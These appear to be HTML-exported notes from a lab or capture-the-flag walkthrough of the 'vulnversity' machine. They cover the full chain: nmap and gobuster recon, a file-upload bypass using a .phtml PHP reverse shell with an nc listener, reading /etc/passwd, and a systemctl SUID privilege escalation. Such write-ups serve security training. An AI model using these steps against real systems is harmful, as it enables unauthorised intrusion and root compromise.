<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>vulnversity</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>vulnversity</h1><br/>1. Scan for Open Ports in nmap<br /><br />nmap -sV -O -p- &lt;IP Address&gt;<br /><br /><a href=""><img src="images/109-1.png" alt="images/109-1.png" /></a><br /><br />2. Enumerate Directories on the web server using Gobuster.<br /><br /><table class="table"><tr><th>GoBuster flag</th><th>Description</th></tr><tr><td>-e</td><td>Print the full URLs in your console</td></tr><tr><td>-u</td><td>The target URL</td></tr><tr><td>-w</td><td>Path to your wordlist</td></tr><tr><td>-U and -P</td><td>Username and Password for Basic Auth</td></tr><tr><td>-p &lt;x&gt;</td><td>Proxy to use for requests</td></tr><tr><td>-c &lt;http cookies&gt;</td><td>Specify a cookie for simulating your auth</td></tr></table><br /><br /><br />gobuster dir -u <a href="http://10.10.0.155:3333">http://10.10.0.155:3333</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<br /><br /><a href=""><img src="images/109-2.png" alt="images/109-2.png" /></a><br /><br />We note that PHP extension is blocked for upload.<br />Use the burpsuite Intruder<br />We&#39;re going to use Intruder (used for automating customised attacks).<br /><br />To begin, make a wordlist with the following extensions in:<br /><br /><a href=""><img src="images/109-3.png" alt="images/109-3.png" /></a><br /><br /><a href=""><img src="images/109-4.png" alt="images/109-4.png" /></a><br /><br />Seeing the burpsuite intruder result, we check the length and conclude, <strong>phtml</strong> extention might be allowed.<br /><br />We get the PHP reverse shell at https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php<br /><br />We make the necessary changes to IP and PORT. Then rename the <strong>php-reverse-shell.php</strong> file to <strong>php-reverse-shell.phtml</strong><br /><br />Then we upload it to the webserver.<br /><br />Start the netcat listener: nc -lvnp 7777 (Port mentioned in reverse shell file)<br />Then run the reverse shell by: <a href="http://10.10.0.155:3333/internal/uploads/php-reverse-shell.phtml">http://10.10.0.155:3333/internal/uploads/php-reverse-shell.phtml</a><br /><br />In the received shell,<br />cat /etc/passwd<br /><br />To know to user who manages this webserver.<br />cd /home/jill<br />cat user.txt<br /><br />We get the user flag.<br /><br />For Root:<br /><br />find / -type f -perm -04000 2&gt;/dev/null<br />or<br />find / -user root -perm -4000 -exec ls -ldb {} \;<br />search all suid set files<br /><br />We find <strong>/bin/systemctl</strong> has SUID bit set.<br /><br />Use GTFOBins and run the following.<br /><br />TF=$(mktemp).service<br /><br />echo &#39;[Service]<br />Type=oneshot<br />ExecStart=/bin/sh -c &quot;id &gt; /tmp/output&quot;<br />[Install]<br />WantedBy=multi-user.target&#39; &gt; $TF<br /><br />systemctl link $TF<br />systemctl enable --now $TF<br /><br /><br />The above will run id command as root and store the output in /tmp/output file.<br /><br />Change your commands after -c to ls /root then cat the flag etc<br />or<br />we can run a reverse shell after -c on a different port and listen in netcat to have a root shell.<br /><br />We get the root flag in both ways.<br /></div>
</body>
</html>
